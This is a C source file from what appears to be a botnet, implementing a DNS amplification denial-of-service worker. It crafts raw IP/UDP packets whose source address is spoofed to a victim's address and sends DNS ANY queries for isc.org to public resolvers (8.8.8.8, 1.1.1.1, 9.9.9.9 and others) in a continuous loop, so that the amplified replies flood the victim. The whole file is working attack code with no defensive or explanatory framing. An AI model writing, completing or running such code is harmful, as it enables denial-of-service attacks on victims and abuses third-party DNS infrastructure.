#include "../../../include/botnet.h"
#include "../../../include/compat/raw_structs.h" // ¡LA SOLUCIÓN DEFINITIVA!

// A small list of public DNS resolvers to use as amplifiers
const char *dns_resolvers[] = {"8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9"};
const int num_resolvers = sizeof(dns_resolvers) / sizeof(char *);

// DNS header structure
struct dnshdr {
    unsigned short id;
    unsigned short flags;
    unsigned short qdcount;
    unsigned short ancount;
    unsigned short nscount;
    unsigned short arcount;
};

// Function to calculate IP checksum
unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) { unsigned short oddbyte = 0; *((unsigned char *)&oddbyte) = *(unsigned char *)ptr; sum += oddbyte; }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

// The worker thread for DNS amplification
void *dns_amp_worker(void *args) {
    struct target *victim = (struct target *)args;
    int sock;
    char datagram[4096];
    // Usamos nuestras propias estructuras con nombres únicos
    struct my_iphdr *iph = (struct my_iphdr *)datagram;
    struct my_udphdr *udph = (struct my_udphdr *)(datagram + sizeof(struct my_iphdr));
    struct dnshdr *dnsh = (struct dnshdr *)(datagram + sizeof(struct my_iphdr) + sizeof(struct my_udphdr));
    char *qname = (datagram + sizeof(struct my_iphdr) + sizeof(struct my_udphdr) + sizeof(struct dnshdr));

    const char *domain_to_query = "isc.org";
    strcpy(qname + 1, domain_to_query);
    char *p = qname;
    for (int i = 0; p[i]; i++) {
        if (p[i] == '.') { *p = i - (p - qname - 1); p = qname + i + 1; }
    }
    *p = strlen(p);

    unsigned short *qtype_class = (unsigned short *)(qname + strlen(qname) + 2);
    *qtype_class++ = htons(255); // ANY
    *qtype_class++ = htons(1);   // IN

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("socket"); return NULL; }
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) { perror("setsockopt"); close(sock); return NULL; }

    struct sockaddr_in sin;
    while (attack_running) {
        for (int j = 0; j < num_resolvers; j++) {
            sin.sin_family = AF_INET;
            sin.sin_port = htons(53);
            sin.sin_addr.s_addr = inet_addr(dns_resolvers[j]);

            memset(datagram, 0, 4096);

            iph->ihl = 5; iph->version = 4; iph->tos = 0;
            iph->tot_len = sizeof(struct my_iphdr) + sizeof(struct my_udphdr) + sizeof(struct dnshdr) + strlen(qname) + 2;
            iph->id = htonl(rand()); iph->frag_off = 0; iph->ttl = 255; iph->protocol = IPPROTO_UDP;
            iph->saddr = victim->addr;
            iph->daddr = sin.sin_addr.s_addr;

            udph->source = htons(rand());
            udph->dest = htons(53);
            udph->len = htons(sizeof(struct my_udphdr) + sizeof(struct dnshdr) + strlen(qname) + 2);
            udph->check = 0;

            dnsh->id = (unsigned short)htons(rand());
            dnsh->flags = htons(0x0100);
            dnsh->qdcount = htons(1);

            iph->check = csum((unsigned short *)datagram, iph->tot_len);

            sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(sock);
    return NULL;
}
